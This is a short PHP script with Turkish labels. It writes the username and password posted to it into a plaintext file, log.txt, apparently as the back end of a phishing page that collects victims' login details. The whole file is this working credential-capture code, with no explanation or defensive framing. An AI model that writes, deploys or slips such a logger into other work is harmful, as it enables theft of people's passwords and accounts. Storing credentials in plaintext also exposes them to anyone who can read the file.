<?php
file_put_contents("log.txt", "Kullanıcı: " . $_POST['username'] . " | Şifre: " . $_POST['password'] . "\n", FILE_APPEND);
?>
